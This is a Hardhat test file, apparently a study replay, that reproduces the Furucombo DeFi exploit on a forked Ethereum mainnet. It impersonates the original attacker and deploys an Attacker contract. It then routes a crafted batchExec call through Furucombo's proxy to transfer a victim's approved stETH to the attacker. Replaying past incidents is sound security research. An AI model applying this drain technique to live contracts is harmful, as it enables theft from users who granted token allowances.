// import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { BigNumber } from 'ethers';
import { ethers, network } from 'hardhat';

import { IERC20, Attacker, IProxy } from '../test-types';

// https://etherscan.io/address/0x86765dde9304bea32f65330d266155c4fa0c4f04
const ATTACKER_CONTRACT = '0x86765dde9304bEa32f65330d266155c4fA0C4F04';
const ATTACKER = '0xb624E2b10b84a41687caeC94BDd484E48d76B212';

// https://etherscan.io/address/0x7d2768de32b0b80b7a3454c06bdac94a69ddc7a9#code
const AAVE_CONTRACT = '0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9';

// https://etherscan.io/address/0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f#code
const FURUCOMBO_CONTRACT = '0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f';

// https://etherscan.io/address/0xae7ab96520de3a18e5e111b5eaab095312d7fe84
const stETH_CONTRACT = '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84';

const victim = '0x78Bc49be7bae5e0eeC08780c86F0e8278B8B035b';

describe('Replaying Furucombo', () => {
	let attacker: SignerWithAddress;

	let stETHToken: IERC20;

	let attackerContract: Attacker;
	let furucomboContract: IProxy;

	before(async () => {
		// Setup attacker
		await network.provider.request({
			method: 'hardhat_impersonateAccount',
			params: [ATTACKER],
		});
		attacker = await ethers.getSigner(ATTACKER);

		// const attackerContract = ethers.getContractAt();

		const AttackerContact = await ethers.getContractFactory('Attacker');

		attackerContract = await AttackerContact.deploy();

		stETHToken = await ethers.getContractAt('IERC20', stETH_CONTRACT);
		furucomboContract = await ethers.getContractAt('IProxy', FURUCOMBO_CONTRACT);
	});

	it('Exploit', async () => {
		// 對 furucombo 設置 aave implementation contract 為 Attacker contract
		await attackerContract.connect(attacker).attackSetup();

		const victimAllowance = await stETHToken.allowance(victim, furucomboContract.address);
		const victimBalance = await stETHToken.balanceOf(victim);

		const canGetVictimBalance = victimBalance.gt(victimAllowance) ? victimAllowance : victimBalance;

		// console.log('Can Get VictimBalance', canGetVictimBalance);

		// 叫 furucombo 執行 Attacker contract 的 attackExcute function
		// 可以傳入想從哪位 victim 轉何種 token 數量為 amount 給 attacker
		const ABI = ['function attackExcute(address token, address victim, uint256 amount)'];
		const iface = new ethers.utils.Interface(ABI);
		const data = iface.encodeFunctionData('attackExcute', [
			stETHToken.address,
			victim,
			canGetVictimBalance,
		]);

		await expect(
			furucomboContract
				.connect(attacker)
				.batchExec(
					[AAVE_CONTRACT],
					['0x0000000000000000000000000000000000000000000000000000000000000000'],
					[data],
				),
		).to.changeTokenBalance(stETHToken, attacker.address, canGetVictimBalance.sub(1)); // 不知道為什麼 stETHToken 數量會少 1
	});

	after(async () => {
		expect(attacker.address).to.equal(ATTACKER);
	});
});
